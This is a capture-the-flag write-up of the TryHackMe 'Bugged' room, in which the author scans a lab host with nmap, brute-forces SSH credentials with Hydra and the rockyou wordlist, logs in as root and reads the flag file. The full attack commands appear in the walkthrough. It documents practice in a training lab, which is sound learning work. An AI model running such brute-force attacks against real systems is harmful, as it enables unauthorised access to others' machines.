**<p align="center">TryHackMe: Bugged</p>**
---

<p align="center">
<img
src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Bugged/Images/room%20icon.png" alt="image alt" width="130" />
</p>

“John likes to live in a very Internet connected world. Maybe too connected…”

[![Day 27 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2027%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)

**Topic:** Web application pentesting

Started: 8/11/2025

“John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?”

<p align="center">+++++++++</p>

Starting off, I ran an Nmap scan to identify open services on the target:
```
nmap -sC -sV 10.201.54.62
```
The scan revealed only one open port:
- 22/tcp – SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.13)

![Alt text](1)

With only SSH exposed, I decided to perform a targeted brute-force attack using Hydra:
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://10.201.54.62
```

Hydra successfully uncovered valid credentials for the root account.

![Alt text](2)

Using these credentials, I SSH’d into the target:
```
ssh root@10.201.54.62
```

![Alt text](3)

Once inside, I enumerated the system, confirmed I had root privileges, and explored the filesystem. In the `/bugged` directory, I found `flag.txt` and retrieved its contents using:
```
cat /bugged/flag.txt
```

![Alt text](4)

Flag captured, room owned!

<p align="center">+</p>

**Lessons Learned**

This room served as a quick, straightforward refresher on using Hydra to brute-force SSH credentials and gain privileged access. I appreciated how light it felt compared to the more challenging rooms I’ve completed.

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers directly. Instead, I’ve documented my full process to support both others and myself in understanding the vulnerability.

**Resources**:
- [TryHackMe's Bugged Room](https://tryhackme.com/room/bugged)
